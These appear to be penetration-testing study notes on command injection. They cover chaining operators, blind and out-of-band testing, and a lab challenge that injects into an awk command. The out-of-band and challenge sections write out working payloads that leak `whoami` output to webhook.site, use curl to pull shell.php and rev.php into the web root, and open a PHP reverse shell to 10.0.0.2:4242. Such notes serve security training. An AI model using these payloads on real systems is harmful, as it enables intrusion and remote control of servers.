# Command Injection

### Command Injection - Introduction

eval() is evil

User input is executed by a function

Never trust user input! Avoid using eval() (JS) and system() (PHP)

### Command Injection - Basics

Wiki https://appsecexplained.gitbook.io

Check paths for binaries with `which`

For reverse shells try to use the language the app is running

Basic command chaining

`; ls -la`

Using logic operators

`&& ls -la`

Commenting out the rest of a command

`; ls -la #`

Using a pipe for command chaining

`| ls -la`

Testing for blind injection

```
; sleep 10
; ping -c 10 127.0.0.1
& whoami > /var/www/html/whoami.txt &
```

Out-of-band testing

```
& nslookup webhook.site/<id>?`whoami` &
```

### Commmand Injection - Blind/Out-of-Band

Use backticks to wrap commands in URLs, use newlines or `&` to execute additional commands

Determine which characters are being filtered

Using webhook.site

```
https://webhook.site/<id>?`whoami`
```

Using locally hosted reverse shell

`https://google.com && curl 10.0.0.2:8080/shell.php > /var/www/html/shell.php`

### Commmand Injection - Challenge

awk 'BEGIN {print sqrt(((100-100)^2) + ((200-300)^2))}'

Payload in Position Y:

`200)^2))}'; whoami;#`
`200)^2))}'; curl 10.0.0.2:8080/rev.php > /var/www/html/rev.php;#`

navigate to localhost/rev.php for reverse shell

Walkthrough payload:

`200)^2))}';php -r '$sock=fsockopen("10.0.0.2",4242);exec("/bin/sh -i <&3 >&3 2>&3");';#`
